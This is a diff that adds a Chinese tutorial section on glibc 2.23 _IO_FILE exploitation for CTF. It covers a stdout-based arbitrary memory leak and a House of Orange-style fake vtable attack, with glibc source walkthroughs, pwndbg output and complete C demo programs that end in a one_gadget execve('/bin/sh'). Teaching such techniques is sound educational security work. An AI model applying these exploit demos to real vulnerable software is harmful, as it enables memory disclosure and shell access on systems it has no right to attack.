@@ -1457,3 +1457,614 @@ constraints:
 
 &emsp;&emsp;<font size=2>这个好像没啥甜品技术，反正要注意`large-bin`不但可以泄漏libc还可以泄漏堆地址，跟`unsorted-bin`不一样的地方就是往任意地址写的是堆地址，而不是`unsorted-bin`的地址。</font></br>
 
+____
+
+## _IO_FILE leak
+
+&emsp;&emsp;<font size=2>在ctf中有时候会遇到一些无法输出堆内容的题目，但是我们可以利用puts函数，修改stdout的`_IO_FILE`结构体来实现任意地址泄漏的手法。看过[puts函数分析]([https://www.fandazh.cn/glibc2-23-_io_file%e7%9b%b8%e5%85%b3%e5%87%bd%e6%95%b0%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90/](https://www.fandazh.cn/glibc2-23-_io_file相关函数原理分析/))的话就会明白IO缓冲区的原理以及这些IO函数是维护了一个`_IO_FILE`结构体来控制输入输出的。</font></br>
+
+&emsp;&emsp;<font size=2>而这个结构体也已经被大佬们分析出来并成为一种利用手法了，那么本节我们首先讲如何利用他来泄漏，看过分析puts的文章后我们知道系统调用write是从`_IO_FILE`的vtable中的overflow函数成功进去的，也就是说我们首先要让控制流进入`_IO_OVERFLOW`，然后我们从`_IO_new_file_xsputn`函数开始看：</font></br>
+
+```C
+_IO_size_t
+_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
+{
+  const char *s = (const char *) data;
+  _IO_size_t to_do = n;
+  int must_flush = 0;
+  _IO_size_t count = 0;
+
+  if (n <= 0)
+    return 0;
+  /* This is an optimized implementation.
+     If the amount to be written straddles a block boundary
+     (or the filebuf is unbuffered), use sys_write directly. */
+
+  /* First figure out how much space is available in the buffer. */
+  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
+    {
+      count = f->_IO_buf_end - f->_IO_write_ptr;
+      if (count >= n)
+        {
+          const char *p;
+          for (p = s + n; p > s; )
+            {
+              if (*--p == '\n')
+                { 
+                  count = p - s + 1;
+                  must_flush = 1;
+                  break;
+                }
+            }
+        }
+    }
+  else if (f->_IO_write_end > f->_IO_write_ptr)
+    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
+
+  /* Then fill the buffer. */
+  if (count > 0)
+    {
+      if (count > to_do)
+        count = to_do;
+#ifdef _LIBC
+      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
+#else
+      memcpy (f->_IO_write_ptr, s, count);
+      f->_IO_write_ptr += count;
+#endif
+      s += count;
+      to_do -= count;
+    }
+  if (to_do + must_flush > 0)
+    {
+      _IO_size_t block_size, do_write;
+      /* Next flush the (full) buffer. */
+      if (_IO_OVERFLOW (f, EOF) == EOF)
+        /* If nothing else has to be written we must not signal the
+           caller that everything has been written.  */
+        return to_do == 0 ? EOF : n - to_do;
+                                        
+```
+
+&emsp;&emsp;<font size=2>接下来我们一步步构造如何控制`_IO_OVERFLOW`输出我们的预期地址的数据。首先这里的data代表puts的参数字符串，n是这个字符串的长度，如果我们构造了`_IO_LINE_BUF`&&`_IO_CURRENTLY_PUTTING`标志位的话，控制流会进入第一个for，但是p指向的字符串不一定会有一个换行符（因为puts的输出会自动加一个换行符，所以我们调用的时候不需要写换行符），因此`must_flush`并不一定会置零，情况还挺麻烦的，因此我们不构造这两个标志位，避免进入第一个循环。</font></br>
+
+&emsp;&emsp;<font size=2>接下来有一个`else if`的条件，我们在这里也要绕过这个判断，为了规避下方`to_do -= count;`可能的麻烦，毕竟也许可以构造成功，但是规避了总更方便。然后下一个`if (to_do + must_flush >0)`判断就必须要满足了，因为`must_flush`初始化为0，`to_do`初始化为n参数，所以可以满足判断，进入`_IO_OVERFLOW`：</font></br>
+
+```C
+int
+_IO_new_file_overflow (_IO_FILE *f, int ch)
+{
+  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
+    {
+      f->_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return EOF;
+    }
+  /* If currently reading or no buffer allocated. */
+  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
+    {
+      /* Allocate a buffer if needed. */
+      if (f->_IO_write_base == NULL)
+        {
+          _IO_doallocbuf (f);
+          _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
+        }
+      /* Otherwise must be currently reading.
+         If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
+         logically slide the buffer forwards one block (by setting the
+         read pointers to all point at the beginning of the block).  This
+         makes room for subsequent output.
+         Otherwise, set the read pointers to _IO_read_end (leaving that
+         alone, so it can continue to correspond to the external position). */
+      if (__glibc_unlikely (_IO_in_backup (f)))
+        {
+          size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
+          _IO_free_backup_area (f);
+          f->_IO_read_base -= MIN (nbackup,
+                                   f->_IO_read_base - f->_IO_buf_base);
+          f->_IO_read_ptr = f->_IO_read_base;
+        }
+
+      if (f->_IO_read_ptr == f->_IO_buf_end)
+        f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
+      f->_IO_write_ptr = f->_IO_read_ptr;
+      f->_IO_write_base = f->_IO_write_ptr;
+      f->_IO_write_end = f->_IO_buf_end; 
+      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;
+
+      f->_flags |= _IO_CURRENTLY_PUTTING;
+      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
+        f->_IO_write_end = f->_IO_write_ptr;
+    }
+  if (ch == EOF)
+    return _IO_do_write (f, f->_IO_write_base,
+                         f->_IO_write_ptr - f->_IO_write_base);
+
+```
+
+&emsp;&emsp;<font size=2>第一个if的`_IO_NO_WRITES`是肯定不能进去的，一进去就直接返回前功尽弃了。往下我们同样避开满足`if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)`这个条件，因为下方对`f->xxxx`等成员的赋值会破坏我们想要输出的地址（后续会看到），必须绕过这个条件。然后因为调用此函数时`ch`参数是`EOF`，因此可以进入`_IO_do_write`：</font></br>
+
+```C
+static
+_IO_size_t
+new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+{
+  _IO_size_t count;
+  if (fp->_flags & _IO_IS_APPENDING)
+    /* On a system without a proper O_APPEND implementation,
+       you would need to sys_seek(0, SEEK_END) here, but is
+       not needed nor desirable for Unix- or Posix-like systems.
+       Instead, just indicate that offset (before and after) is
+       unpredictable. */
+    fp->_offset = _IO_pos_BAD;
+  else if (fp->_IO_read_end != fp->_IO_write_base)
+    {
+      _IO_off64_t new_pos
+        = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
+      if (new_pos == _IO_pos_BAD)
+        return 0;
+      fp->_offset = new_pos;
+    }
+  count = _IO_SYSWRITE (fp, data, to_do);
+
+```
+
+&emsp;&emsp;<font size=2>可以看到下方的`_IO_SYSWRITE`就是我们的目标了，就是这里进行了系统调用write输出内容，分析一下参数就可以知道，我们就是利用的`_IO_write_base`作为输出的起始地址，`_IO_write_ptr - _IO_write_base`就是输出的长度。接下来只剩下最后两个if了，如果我们满足`else if`的条件的话，还要经过一次`_IO_SYSSEEK`，比较麻烦，不知道会寻址到哪里去，不如直接构造`_IO_IS_APPENDING`标志位，`_offset`的设置无伤大雅，综上我们可以得出一个结论，要实现一次任意地址泄漏，我们可以如下构造：</font></br>
+
+- _flags = 0xfbad0000;
+- flags |=  _IO_CURRENTLY_PUTTING;	//0x800
+
+- _flags |=  _IO_IS_APPENDING;    // 0x1000
+- \_flags &=  (~_IO_NO_WRITES);    //0x8
+- _flags = 0xfbad1800;
+
+&emsp;&emsp;<font size=2>然后`_IO_write_base`和`_IO_write_ptr`只需要指向我们想要的泄漏区间就行了，这样就能完成任意地址泄漏，demo如下：</font></br>
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <libio.h>
+
+typedef unsigned long long ull;
+
+void setbufs()
+{
+	setvbuf(stdout, 0, 2, 0);
+	setvbuf(stdin, 0, 2, 0);
+	setvbuf(stderr, 0, 2, 0);
+}
+
+int main()
+{
+	ull *p1, *p2, *p3, *p4, *p;
+	_IO_FILE* pstdout;
+
+	setbufs();
+
+	// init the _IO_2_1_stdout_
+	puts("hello,world!");
+	pstdout = stdout;
+	printf("&_flags:%llx\n", (ull)&pstdout->_flags);
+
+	pstdout->_flags = (0xfbad0000 | _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING & (~_IO_NO_WRITES));
+	*(unsigned char*)&pstdout->_IO_write_base = 0;
+  // leak here
+	puts("something");
+
+	return 0;
+}
+
+/*
+struct _IO_FILE {
+  int _flags;
+  char* _IO_read_ptr;   
+  char* _IO_read_end;   
+  char* _IO_read_base;  
+  char* _IO_write_base; 
+  char* _IO_write_ptr;  
+  char* _IO_write_end;  
+  char* _IO_buf_base;   
+  char* _IO_buf_end;    
+  char *_IO_save_base;
+  char *_IO_backup_base;
+  char *_IO_save_end;
+
+  struct _IO_marker *_markers;
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; 
+
+#define __HAVE_COLUMN 
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+ */
+
+```
+
+____
+
+## fake _IO_FILE
+
+&emsp;&emsp;<font size=2>伪造`_IO_FILE`这个现在其实用的是比较多的，`glibc2.23`没有做什么检查，而`glibc2.24`开始就有对`vtable`做一些检查，但绕过也非常简单，这个系列主要是讲`glibc2.23`的，因此其他的就自行搜索其他资料吧，如果以后得空了说不定也会分析一下。</font></br>
+
+&emsp;&emsp;<font size=2>最初ctf上伪造`_IO_FILE`的好像是一个叫`house of orange`的题目，利用原理就是用`unsorted-bin attack`修改了`_IO_list_all`指向的链表，然后故意触发错误从`malloc_printerr`一路到了伪造的`vtable`上的`__overflow`，就顺势getshell了。我们先从`unsorted-bin attack`修改的`_IO_list_all`开始分析吧：</font></br>
+
+```C
+        void *p1, *p2, *p3, *p4;
+        ull *p;
+        ull libc_base = 0;
+        ull _IO_list_all = 0x3c5520;
+        ull one_gadget = 0xf1147;
+
+        setvbufs();
+        p1=malloc(0x100);
+        malloc(0x20);
+
+        free(p1);
+        malloc(0xa0);
+
+        p2 = malloc(0x100);
+        // now we have a 0x60 smallbin
+        //
+        // avoid smallbin to be alloced, use 0x100
+        malloc(0x100);
+
+        free(p2);
+        libc_base = *(ull*)p2 - 0x3c4b78;
+        *((ull*)p2+1) = libc_base+_IO_list_all - sizeof(void*)*2;
+
+        malloc(0x100);
+
+```
+
+&emsp;&emsp;<font size=2>这是一段利用完刚修改`_IO_list_all`的demo代码，为什么我们要修改`_IO_list_all`呢？因为这个全局变量是指向一个`_IO_FILE`结构体的`_IO_2_1_stderr_`，而这个`_IO_FILE`又是通过其中的`_chain`元素把每一个结构体串联在一起形成的链表，如果结构体有问题，那么在触发错误的时候系统会根据`_chain`查找到下一个节点。</font></br>
+
+&emsp;&emsp;<font size=2>接下来我们再想想为什么要用`unsorted-bin attack`写入一个`main_arena`到`_IO_list_all`里去呢？写入之后，其`_chain`是什么？没错，就是`main_arena`中smallbin数组的某个size索引的堆块位置处，而这个size就是`0x60`。如下`unsorted-bin attack`完成后的情况：</font></br>
+
+```
+pwndbg> x/xg & _IO_list_all
+0x7ffff7dd2520 <_IO_list_all>:	0x00007ffff7dd1b78
+pwndbg> x/20xg & main_arena
+0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
+0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602360
+0x7ffff7dd1b80 <main_arena+96>:	0x00000000006020b0	0x0000000000602140
+0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd2510	0x00007ffff7dd1b88
+0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98
+0x7ffff7dd1bb0 <main_arena+144>:	0x00007ffff7dd1b98	0x00007ffff7dd1ba8
+pwndbg> 
+0x7ffff7dd1bc0 <main_arena+160>:	0x00007ffff7dd1ba8	0x00007ffff7dd1bb8
+0x7ffff7dd1bd0 <main_arena+176>:	0x00007ffff7dd1bb8	0x00000000006020b0
+0x7ffff7dd1be0 <main_arena+192>:	0x00000000006020b0	0x00007ffff7dd1bd8
+0x7ffff7dd1bf0 <main_arena+208>:	0x00007ffff7dd1bd8	0x00007ffff7dd1be8
+0x7ffff7dd1c00 <main_arena+224>:	0x00007ffff7dd1be8	0x00007ffff7dd1bf8
+0x7ffff7dd1c10 <main_arena+240>:	0x00007ffff7dd1bf8	0x00007ffff7dd1c08
+0x7ffff7dd1c20 <main_arena+256>:	0x00007ffff7dd1c08	0x00007ffff7dd1c18
+0x7ffff7dd1c30 <main_arena+272>:	0x00007ffff7dd1c18	0x00007ffff7dd1c28
+0x7ffff7dd1c40 <main_arena+288>:	0x00007ffff7dd1c28	0x00007ffff7dd1c38
+0x7ffff7dd1c50 <main_arena+304>:	0x00007ffff7dd1c38	0x00007ffff7dd1c48
+pwndbg> p *(struct _IO_FILE_plus*)0x00007ffff7dd1b78
+$1 = {
+  file = {
+    _flags = 6300512, 
+    _IO_read_ptr = 0x6020b0 "", 
+    _IO_read_end = 0x602140 "", 
+    _IO_read_base = 0x7ffff7dd2510 "", 
+    _IO_write_base = 0x7ffff7dd1b88 <main_arena+104> "@!`", 
+    _IO_write_ptr = 0x7ffff7dd1b88 <main_arena+104> "@!`", 
+    _IO_write_end = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
+    _IO_buf_base = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
+    _IO_buf_end = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
+    _IO_save_base = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
+    _IO_backup_base = 0x7ffff7dd1bb8 <main_arena+152> "\250\033\335\367\377\177", 
+    _IO_save_end = 0x7ffff7dd1bb8 <main_arena+152> "\250\033\335\367\377\177", 
+    _markers = 0x6020b0, 
+    _chain = 0x6020b0, 
+    _fileno = -136504360, 
+    _flags2 = 32767, 
+    _old_offset = 140737351850968, 
+    _cur_column = 7144, 
+    _vtable_offset = -35 '\335', 
+    _shortbuf = <incomplete sequence \367>, 
+    _lock = 0x7ffff7dd1be8 <main_arena+200>, 
+    _offset = 140737351851000, 
+    _codecvt = 0x7ffff7dd1bf8 <main_arena+216>, 
+    _wide_data = 0x7ffff7dd1c08 <main_arena+232>, 
+    _freeres_list = 0x7ffff7dd1c08 <main_arena+232>, 
+    _freeres_buf = 0x7ffff7dd1c18 <main_arena+248>, 
+    __pad5 = 140737351851032, 
+    _mode = -136504280, 
+    _unused2 = "\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000"
+  }, 
+  vtable = 0x7ffff7dd1c38 <main_arena+280>
+}
+pwndbg> 
+```
+
+&emsp;&emsp;<font size=2>`_IO_list_all`被修改为`unsorted-bin list`地址，然后用`_IO_FILE`结构体去看的话`_chain`就是size为`0x60`位置的smallbin地址。这样一来在查找链表下一个节点的时候刚好落在了我们的堆块上，也就是我们有了伪造`_IO_FILE`结构的机会。不知道为啥是`0x60`的话得去好好分析一下`_int_malloc`咯，我只能告诉你放入的关键代码是：</font></br>
+
+```C
+          mark_bin (av, victim_index);
+          victim->bk = bck;
+          victim->fd = fwd;
+          fwd->bk = victim;
+          bck->fd = victim;
+```
+
+&emsp;&emsp;<font size=2>接下来我们讲讲如何伪造`_IO_FILE`，假设我们触发一个堆错误，glibc里会调用`malloc_printerr`：</font></br>
+
+```C
+static void
+malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
+{
+  /* Avoid using this arena in future.  We do not attempt to synchronize this
+     with anything else because we minimally want to ensure that __libc_message
+     gets its resources safely without stumbling on the current corruption.  */
+  if (ar_ptr)
+    set_arena_corrupt (ar_ptr);
+
+  if ((action & 5) == 5)
+    __libc_message (action & 2, "%s\n", str);
+  else if (action & 1)
+    {
+      char buf[2 * sizeof (uintptr_t) + 1];
+
+      buf[sizeof (buf) - 1] = '\0';
+      char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0);
+      while (cp > buf)
+        *--cp = '0';
+
+      __libc_message (action & 2, "*** Error in `%s': %s: 0x%s ***\n",
+                      __libc_argv[0] ? : "<unknown>", str, cp);
+    }
+  else if (action & 2)
+    abort ();
+}
+```
+
+&emsp;&emsp;<font size=2>因为我们的`double free`、`link corruption`或者堆错误一般`action`参数都是`check_action`，其定义如下：</font></br>
+
+```C
+#ifndef DEFAULT_CHECK_ACTION
+# define DEFAULT_CHECK_ACTION 3
+#endif
+
+static int check_action = DEFAULT_CHECK_ACTION;
+/*
+          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
+            {
+              errstr = "malloc(): memory corruption (fast)";
+            errout:
+              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
+              return NULL;
+            }
+*/
+```
+
+&emsp;&emsp;<font size=2>所以会调用`__libc_message`：</font></br>
+
+```C
+/* Abort with an error message.  */
+void
+__libc_message (int do_abort, const char *fmt, ...)
+{
+  va_list ap;
+  int fd = -1;
+
+  // ...
+  // balabala
+  
+    if (do_abort)
+    {
+      BEFORE_ABORT (do_abort, written, fd);
+
+      /* Kill the application.  */
+      abort ();
+    }
+}
+```
+
+&emsp;&emsp;<font size=2>`do_abort = 3&1 = 1`，所以会调用`abort()`：</font></br>
+
+```C
+/* Cause an abnormal program termination with core-dump.  */
+void
+abort (void)
+{
+  // ...
+  // balabala
+  
+    /* Flush all streams.  We cannot close them now because the user
+     might have registered a handler for SIGABRT.  */
+  if (stage == 1)
+    {
+      ++stage;
+      fflush (NULL);
+    }
+```
+
+&emsp;&emsp;<font size=2>调用的`fflush`就是`_IO_flush_all_lockp`：</font></br>
+
+```C
+int
+_IO_flush_all_lockp (int do_lock)
+{
+  int result = 0;
+  struct _IO_FILE *fp;
+  int last_stamp;
+
+#ifdef _IO_MTSAFE_IO
+  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
+  if (do_lock)
+    _IO_lock_lock (list_all_lock);
+#endif
+
+  last_stamp = _IO_list_all_stamp;
+  fp = (_IO_FILE *) _IO_list_all;
+  while (fp != NULL)
+    {
+      run_fp = fp;
+      if (do_lock)
+        _IO_flockfile (fp);
+
+      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
+#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+           || (_IO_vtable_offset (fp) == 0
+               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
+                                    > fp->_wide_data->_IO_write_base))
+#endif
+           )
+          && _IO_OVERFLOW (fp, EOF) == EOF)
+        result = EOF;
+
+      if (do_lock)
+        _IO_funlockfile (fp);
+      run_fp = NULL;
+
+      if (last_stamp != _IO_list_all_stamp)
+        {
+          /* Something was added to the list.  Start all over again.  */
+          fp = (_IO_FILE *) _IO_list_all;
+          last_stamp = _IO_list_all_stamp;
+        }
+      else
+        fp = fp->_chain;
+    }
+
+```
+
+&emsp;&emsp;<font size=2>这里出现的`_IO_OVERFLOW`就是我们可以伪造的`vtable`上的函数指针，可以看到`fp`先指向`_IO_list_all`，后面有用`fp = fp->_chain`遍历。要使控制流到达我们的`_IO_OVERFLOW`需要满足：</font></br>
+
+```C
+(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
+||
+(_IO_vtable_offset (fp) == 0
+               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
+                                    > fp->_wide_data->_IO_write_base)
+
+```
+
+&emsp;&emsp;<font size=2>虽然第二个也可以，但是显然第一个看着就方便很多，我们直接构造为第一个就行：</font></br>
+
+```C
+        // fake _mode
+        *p = 0;
+        // _IO_write_base
+        *(p+4) = 0;
+        // _IO_write_ptr
+        *(p+5) = 1;
+        // __overflow in vtable
+        *(p+3) = libc_base+one_gadget;
+        // fake vtable
+        *(ull*)((ull)p+0xd8) = (ull)p;
+
+```
+
+&emsp;&emsp;<font size=2>这里的p指向我们伪造的`_IO_FILE`头部，只要这样构造好：</font></br>
+
+```C
+fp->_mode = 0;
+fp->_IO_write_base = 0;
+fp->_IO_write_ptr = 1;
+
+```
+
+&emsp;&emsp;<font size=2>就能使`_IO_OVERFLOW`得到执行，而`_IO_OVERFLOW`又是`_IO_FILE_plus`中的`vtable`成员。偏移为`0xd8`，因此直接把vtable伪造为一个地址，然后在这个地址的`_IO_OVERFLOW`偏移（0x18)处放上`one_gadget`就可以了。完整demo如下：</font></br>
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <libio.h>
+
+typedef unsigned long long ull;
+
+void setvbufs()
+{
+	setvbuf(stdin, 0, 2, 0);
+	setvbuf(stdout, 0, 2, 0);
+	setvbuf(stderr, 0, 2, 0);
+}
+int main()
+{
+	void *p1, *p2, *p3, *p4;
+	ull *p;
+	ull libc_base = 0;
+	ull _IO_list_all = 0x3c5520;
+	ull one_gadget = 0xf1147;
+	
+	setvbufs();
+	p1=malloc(0x100);
+	malloc(0x20);
+
+	free(p1);
+	malloc(0xa0);
+
+	p2 = malloc(0x100);
+	// now we have a 0x60 smallbin
+	//
+	// avoid smallbin to be alloced, use 0x100
+	malloc(0x100);
+
+	free(p2);
+	libc_base = *(ull*)p2 - 0x3c4b78;
+	*((ull*)p2+1) = libc_base+_IO_list_all - sizeof(void*)*2;
+
+	malloc(0x100);
+
+	p = (ull*)((ull)p1+0xa0);
+	// 'p' pointer to the chain of _IO_list_all
+	// fake _mode
+	*p = 0;
+	// _IO_write_base
+	*(p+4) = 0;
+	// _IO_write_ptr
+	*(p+5) = 1;
+	// __overflow in vtable
+	*(p+3) = libc_base+one_gadget;
+	// fake vtable
+	*(ull*)((ull)p+0xd8) = (ull)p;
+	
+	// unsorted bin is corrputed
+	// just trigger it
+	p3 = malloc(0x20);
+	free(p3);
+	free(p3);
+
+
+	return 0;
+}
+
+/*
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+*/
+
+```
+
